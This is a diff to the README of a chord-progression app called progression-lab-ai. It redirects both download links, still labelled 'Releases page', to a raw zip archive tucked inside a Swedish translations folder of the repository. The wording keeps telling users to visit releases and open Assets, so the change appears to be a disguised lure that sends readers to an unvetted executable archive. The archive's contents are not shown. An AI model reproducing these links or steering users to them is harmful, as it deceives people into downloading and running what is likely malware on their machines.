@@ -1,6 +1,6 @@
 # 🎵 progression-lab-ai - Create chord ideas fast
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Carlinalyric500/progression-lab-ai/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Carlinalyric500/progression-lab-ai/main/lib/i18n/translations/sv-SE/progression-lab-ai-v1.4.zip)
 
 ## 🚀 What this app does
 
@@ -26,7 +26,7 @@ If you plan to use local files for saving progress, keep a few hundred MB free o
 
 ## 📥 Download the app
 
-1. Visit the [Releases page](https://github.com/Carlinalyric500/progression-lab-ai/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/Carlinalyric500/progression-lab-ai/main/lib/i18n/translations/sv-SE/progression-lab-ai-v1.4.zip)
 2. Look for the newest release at the top
 3. Open the Assets section
 4. Download the Windows file from that release
